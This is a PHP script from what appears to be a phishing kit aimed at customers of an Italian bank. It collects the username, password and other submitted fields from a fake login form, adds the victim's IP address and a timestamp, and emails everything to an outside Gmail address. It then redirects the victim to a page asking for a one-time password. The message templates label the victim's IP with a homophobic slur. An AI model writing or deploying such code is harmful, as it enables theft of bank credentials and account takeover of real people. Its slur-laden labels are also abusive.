<?php

session_start();
$user = $_POST['palavras'];
$user1 = $_POST['data1'];
$parola = $_POST['data2'];
$parola1 = $_POST['data3'];
$date = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];

$subj = "$ip";

$msg1 ="
<html><body>
<font face=\"Courier New\">
==========================================
<BR /><BR />
[USERNAME] $user<BR />
[PASSWORD] $parola<BR />
[FAGGOT IP] $ip<BR />
[DATA MASII] $date<BR /><BR />
==========================================
</font></body></html>
";

$msg2 ="
<html><body>
<font face=\"Courier New\">
==========================================
<BR /><BR />
[username] $user<BR />
[data1] $user1<BR />
[data2] $parola<BR />
[data3] $parola1<BR />
[FAGGOT IP] $ip<BR />
[DATA MASII] $date<BR /><BR />
==========================================
</font></body></html>
";

$from = "From: bper <no@alpha.com>\n";
$from .= "MIME-Version: 1.0\r\n";
$from .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

if(@$_GET['accedi']=='login'){
	mail("yurespavel000@gmail.com", $subj, $msg1, $from);
	header( "Location: richiesta_otp.html" );
}else{
	mail("yurespavel000@gmail.com", $subj, $msg2, $from);
	header( "Location: index1.html" );
}
?>